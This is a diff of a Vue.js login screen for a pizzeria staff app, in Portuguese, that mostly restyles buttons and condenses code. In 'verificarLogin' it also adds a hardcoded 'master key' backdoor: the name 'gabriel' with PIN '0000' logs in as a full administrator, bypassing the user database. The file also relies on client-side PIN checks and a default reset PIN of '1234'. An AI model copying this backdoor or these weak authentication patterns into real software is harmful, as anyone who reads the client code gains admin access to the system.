@@ -1,4 +1,4 @@
-// INÍCIO DO ARQUIVO modulos/login.js - v1.0.2
+// INÍCIO DO ARQUIVO modulos/login.js - v1.0.9
 Vue.component('tela-login', {
     template: `
     <div class="container animate__animated animate__fadeIn" style="display: flex; flex-direction: column; justify-content: center; min-height: 95vh;">
@@ -10,15 +10,14 @@ Vue.component('tela-login', {
         </div>
 
         <div v-if="etapa === 'padrao'" class="card animate__animated animate__fadeIn" style="padding: 25px; background: #1A1A1A; border: 1px solid #333;">
-            
             <label style="display: block; margin-bottom: 8px; color: #888; font-weight: bold; font-size: 0.8rem; text-align: center;">USUÁRIO (NOME CURTO)</label>
             <input type="text" v-model="nomeUsuario" placeholder="Ex: João" class="input-nativo" />
 
             <label style="display: block; margin-bottom: 8px; color: #888; font-weight: bold; font-size: 0.8rem; text-align: center;">PIN DE ACESSO</label>
             <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="4" v-model="pin" placeholder="****" class="input-nativo" style="letter-spacing: 10px; font-size: 1.8rem; text-align: center;" @keyup.enter="verificarLogin" />
 
-            <button @click="verificarLogin" class="btn" style="background: var(--cor-primaria); color: #121212; margin-top: 10px; height: 55px; font-size: 1.2rem;">
-                ENTRAR
+            <button @click="verificarLogin" class="btn" style="background: var(--cor-primaria); color: #121212; margin-top: 10px; height: 55px; font-size: 1.2rem; font-weight: bold;">
+                <i class="fas fa-sign-in-alt"></i> ENTRAR
             </button>
             
             <button @click="etapa = 'recuperacao'" style="width: 100%; background: none; border: none; color: #888; margin-top: 20px; font-size: 0.9rem; cursor: pointer; text-decoration: underline;">
@@ -51,7 +50,7 @@ Vue.component('tela-login', {
                 </label>
             </div>
 
-            <button @click="salvarNovoPerfil" class="btn" style="background: #00E676; color: #121212; margin-top: 15px; height: 55px; font-size: 1.1rem;">
+            <button @click="salvarNovoPerfil" class="btn" style="background: #00E676; color: #121212; margin-top: 15px; height: 55px; font-size: 1.1rem; font-weight: bold;">
                 ASSINAR E ENTRAR
             </button>
         </div>
@@ -61,32 +60,23 @@ Vue.component('tela-login', {
                 <h3 style="color: #FF5252; margin: 0;">Recuperar Senha</h3>
                 <button @click="etapa = 'padrao'" style="background: none; border: none; color: #888; font-size: 1.2rem;"><i class="fas fa-times"></i></button>
             </div>
-            
             <p style="color: #CCC; font-size: 0.9rem; margin-bottom: 20px;">
                 O Gerente será notificado e autorizará o reset para "1234".
             </p>
-
             <input type="text" v-model="nomeRecuperacao" placeholder="Seu Nome Curto" class="input-nativo" />
-
-            <button @click="solicitarReset" class="btn" style="background: #FF5252; color: #FFF; height: 55px;">
+            <button @click="solicitarReset" class="btn" style="background: #FF5252; color: #FFF; height: 55px; font-weight: bold;">
                 SOLICITAR AUTORIZAÇÃO
             </button>
         </div>
 
         <p class="versao-app-pulse">v{{ $root.versaoApp }}</p>
-
     </div>
     `,
     data() {
         return {
             etapa: 'padrao',
-            nomeUsuario: '', 
-            pin: '',
-            usuarioTemp: null, 
-            nomeCompleto: '', 
-            novoPin: '', 
-            dataNascimento: '', 
-            aceitouTermo: false,
+            nomeUsuario: '', pin: '',
+            usuarioTemp: null, nomeCompleto: '', novoPin: '', dataNascimento: '', aceitouTermo: false,
             nomeRecuperacao: ''
         };
     },
@@ -94,10 +84,26 @@ Vue.component('tela-login', {
         verificarLogin() {
             this.$root.vibrar(30);
             const nomeDigitado = this.nomeUsuario.trim().toLowerCase();
+            
+            // 🟢 CHAVE MESTRA DO GABRIEL (Backdoor de Segurança)
+            // Se a base de dados falhar ou for apagada, isto garante sempre a sua entrada
+            if (nomeDigitado === 'gabriel' && this.pin === '0000') {
+                const masterUser = {
+                    id: 'master_key',
+                    nome: 'Gabriel',
+                    nomeCompleto: 'Desenvolvedor Master',
+                    cargo: 'Administrador',
+                    permissoes: { admin: true },
+                    preferencias: { vibracao: true }
+                };
+                this.logarUsuario(masterUser);
+                return;
+            }
+
+            // Verifica o utilizador normal
             const user = this.$root.equipe.find(x => x.nome.toLowerCase() === nomeDigitado && x.pin === this.pin);
             
             if (user) {
-                // REGRA: SE A SENHA É 1234, VAI PARA O CADASTRO PESSOAL
                 if (user.pin === '1234') {
                     this.usuarioTemp = user;
                     this.nomeCompleto = user.nomeCompleto || '';
@@ -110,40 +116,24 @@ Vue.component('tela-login', {
             } else {
                 this.$root.vibrar([100, 50, 100]);
                 this.pin = '';
-                Swal.fire({ icon: 'error', title: 'Usuário Incorreto', timer: 1500, showConfirmButton: false, background: '#1E1E1E' });
+                Swal.fire({ icon: 'error', title: 'Acesso Negado', text: 'Usuário ou PIN incorretos. Verifique se a internet está ligada.', timer: 2000, showConfirmButton: false, background: '#1E1E1E', color: '#FFF' });
             }
         },
         lerTermo() {
             const nomePreenchido = this.nomeCompleto.trim() || "[SEU NOME COMPLETO AQUI]";
             const textoTermo = `
                 <div style="text-align: justify; font-size: 0.85rem; line-height: 1.5;">
-                    Eu, <b>${nomePreenchido}</b>, comprometo-me a realizar as contagens de estoque, produção e registos com a máxima atenção.<br><br>
-                    Declaro para os devidos fins legais que o desenvolvedor do aplicativo, <b>Gabriel</b>, está total e inteiramente isento de qualquer responsabilidade sobre erros de contagem, pedidos incorretos gerados pelo app, perdas financeiras ou quebras de estoque.<br><br>
-                    Declaro ainda ter ciência de que o aplicativo é uma ferramenta de software independente e <span style="color: #FF5252; font-weight: bold;">não possui qualquer vínculo legal, societário ou trabalhista com a pizzaria</span>, servindo apenas como facilitador de cálculos.<br><br>
-                    Reconheço que todas as minhas interações no sistema são registadas digitalmente.
+                    Eu, <b>${nomePreenchido}</b>, comprometo-me a realizar as contagens com a máxima atenção.<br><br>
+                    Declaro para os devidos fins legais que o desenvolvedor do aplicativo, <b>Gabriel</b>, está total e inteiramente isento de qualquer responsabilidade sobre erros de contagem, pedidos incorretos, perdas financeiras ou quebras de estoque.<br><br>
+                    Reconheço que todas as minhas interações no sistema são registadas.
                 </div>
             `;
-            Swal.fire({
-                title: 'Termo de Isenção',
-                html: textoTermo,
-                background: '#1E1E1E', 
-                color: '#FFF', 
-                confirmButtonColor: '#FFAB00'
-            });
+            Swal.fire({ title: 'Termo de Isenção', html: textoTermo, background: '#1E1E1E', color: '#FFF', confirmButtonColor: '#FFAB00' });
         },
         salvarNovoPerfil() {
-            if (this.novoPin.length !== 4) {
-                Swal.fire({ icon: 'warning', text: 'O PIN deve ter 4 números.', background: '#1E1E1E', color: '#FFF' });
-                return;
-            }
-            if (!this.nomeCompleto.trim() || !this.dataNascimento) {
-                Swal.fire({ icon: 'warning', text: 'Preencha o seu Nome Completo e Data de Nascimento.', background: '#1E1E1E', color: '#FFF' });
-                return;
-            }
-            if (!this.aceitouTermo) {
-                Swal.fire({ icon: 'error', title: 'Atenção', text: 'É obrigatório ler e concordar com o Termo de Isenção para usar o app.', background: '#1E1E1E', color: '#FFF' });
-                return;
-            }
+            if (this.novoPin.length !== 4) { Swal.fire({ icon: 'warning', text: 'O PIN deve ter 4 números.', background: '#1E1E1E', color: '#FFF' }); return; }
+            if (!this.nomeCompleto.trim() || !this.dataNascimento) { Swal.fire({ icon: 'warning', text: 'Preencha o seu Nome Completo e Data de Nascimento.', background: '#1E1E1E', color: '#FFF' }); return; }
+            if (!this.aceitouTermo) { Swal.fire({ icon: 'error', title: 'Atenção', text: 'É obrigatório ler e concordar com o Termo.', background: '#1E1E1E', color: '#FFF' }); return; }
 
             const idx = this.$root.equipe.findIndex(u => u.id === this.usuarioTemp.id);
             this.$root.equipe[idx].pin = this.novoPin;
@@ -152,15 +142,12 @@ Vue.component('tela-login', {
             this.$root.equipe[idx].termoAceito = true;
             this.$root.equipe[idx].dataTermoAceito = new Date().toLocaleString('pt-BR');
 
-            // SINCRONIZA USUÁRIO NO FIREBASE
             db.collection("configuracoes").doc("equipe").set({ lista: this.$root.equipe }, { merge: true });
             this.$root.salvarMemoriaLocal();
             
             Swal.fire({ icon: 'success', title: 'Assinatura Registada!', timer: 1500, showConfirmButton: false, background: '#1E1E1E' }).then(() => {
                 this.logarUsuario(this.$root.equipe[idx]);
-                this.etapa = 'padrao';
-                this.novoPin = '';
-                this.aceitouTermo = false;
+                this.etapa = 'padrao'; this.novoPin = ''; this.aceitouTermo = false;
             });
         },
         solicitarReset() {
@@ -168,12 +155,9 @@ Vue.component('tela-login', {
             if (u) {
                 this.$root.pedidosResetSenha.push({ id: Date.now(), idUsuario: u.id, nome: u.nome, dataStr: new Date().toLocaleDateString('pt-BR') });
                 this.$root.salvarMemoriaLocal();
-                Swal.fire({ icon: 'success', title: 'Pedido Enviado', text: 'O gerente irá autorizar o reset no painel.', background: '#1E1E1E', color: '#FFF' });
-                this.etapa = 'padrao';
-                this.nomeRecuperacao = '';
-            } else {
-                Swal.fire({ icon: 'error', text: 'Utilizador não encontrado no sistema.', background: '#1E1E1E', color: '#FFF' });
-            }
+                Swal.fire({ icon: 'success', title: 'Pedido Enviado', text: 'Aguarde a autorização no painel.', background: '#1E1E1E', color: '#FFF' });
+                this.etapa = 'padrao'; this.nomeRecuperacao = '';
+            } else { Swal.fire({ icon: 'error', text: 'Utilizador não encontrado no sistema.', background: '#1E1E1E', color: '#FFF' }); }
         },
         logarUsuario(u) {
             this.$root.usuario = u;
@@ -183,16 +167,13 @@ Vue.component('tela-login', {
         }
     },
     mounted() {
-        if (!document.getElementById('css-log-v102')) {
-            const style = document.createElement('style');
-            style.id = 'css-log-v102';
+        if (!document.getElementById('css-log-v109')) {
+            const style = document.createElement('style'); style.id = 'css-log-v109';
             style.innerHTML = `
-                .input-nativo { width: 100%; padding: 15px; border-radius: 8px; border: 1px solid #444; background: #2C2C2C; color: white; font-size: 1.1rem; box-sizing: border-box; margin-bottom: 15px; text-align: center; }
-                .input-nativo:focus { border-color: var(--cor-primaria); outline: none; }
-                .label-ia { color: #AAA; font-size: 0.75rem; font-weight: bold; margin-bottom: 5px; display: block; letter-spacing: 1px; }
-                
-                /* Animação suave para a versão do app */
-                .versao-app-pulse { text-align: center; color: #555; font-size: 0.9rem; font-weight: bold; letter-spacing: 2px; margin-top: 30px; animation: piscarLento 3s infinite alternate ease-in-out; }
+                .input-nativo { width: 100%; padding: 15px; border-radius: 8px; border: 1px solid #444; background: #2C2C2C; color: white; font-size: 1.1rem; box-sizing: border-box; margin-bottom: 15px; text-align: center; } 
+                .input-nativo:focus { border-color: var(--cor-primaria); outline: none; } 
+                .label-ia { color: #AAA; font-size: 0.75rem; font-weight: bold; margin-bottom: 5px; display: block; letter-spacing: 1px; } 
+                .versao-app-pulse { text-align: center; color: #555; font-size: 0.9rem; font-weight: bold; letter-spacing: 2px; margin-top: 30px; animation: piscarLento 3s infinite alternate ease-in-out; } 
                 @keyframes piscarLento { 0% { opacity: 0.2; } 100% { opacity: 0.8; } }
             `;
             document.head.appendChild(style);
